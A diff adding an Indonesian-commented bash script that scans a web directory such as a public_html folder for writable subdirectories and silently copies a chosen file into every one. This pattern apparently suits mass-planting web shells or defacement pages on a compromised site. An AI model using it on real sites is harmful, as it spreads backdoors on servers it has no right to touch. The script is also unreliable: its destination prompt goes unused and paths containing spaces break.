@@ -1,0 +1,53 @@
+#!/bin/bash
+
+# Meminta input dari user untuk nama file yang akan disalin
+echo -n "Masukkan nama file yang akan disalin: "
+read file_name
+
+# Memeriksa apakah file yang akan disalin ada
+if [ ! -f "$file_name" ]; then
+    echo "Error: File '$file_name' tidak ditemukan."
+    exit 1
+fi
+
+# Meminta input dari user untuk direktori tempat pemindaian akan dilakukan
+echo -n "Masukkan direktori tempat pemindaian akan dilakukan (contoh: /home/muratara/public_html): "
+read scan_directory
+
+# Validasi direktori yang dimasukkan oleh pengguna
+if [ ! -d "$scan_directory" ]; then
+    echo "Error: Direktori '$scan_directory' tidak ditemukan."
+    exit 1
+fi
+
+# Menemukan semua direktori yang writable di dalam direktori yang dipilih oleh pengguna
+writable_dirs=$(find "$scan_directory" -type d -perm -u+w)
+
+# Jika tidak ada direktori yang writable ditemukan
+if [ -z "$writable_dirs" ]; then
+    echo "Tidak ditemukan direktori yang writable di '$scan_directory'."
+    exit 1
+fi
+
+# Meminta input dari user untuk memilih direktori tujuan
+echo "Direktori writable yang ditemukan di '$scan_directory':"
+echo "$writable_dirs"
+echo
+echo -n "Masukkan path dari direktori tujuan untuk menyalin file: "
+read destination_dir
+
+# Validasi bahwa direktori tujuan yang dimasukkan oleh pengguna valid
+if [ ! -d "$destination_dir" ]; then
+    echo "Error: Direktori tujuan tidak valid."
+    exit 1
+fi
+
+# Menyalin file ke setiap direktori yang writable yang ditemukan
+echo "Menyalin file '$file_name' ke setiap direktori writable yang ditemukan di '$scan_directory':"
+
+for dir in $writable_dirs; do
+    cp "$file_name" "$dir" >/dev/null 2>&1  # Menggunakan /dev/null untuk mengabaikan output dari cp
+    echo "- $dir"
+done
+
+echo "Penyalinan selesai."
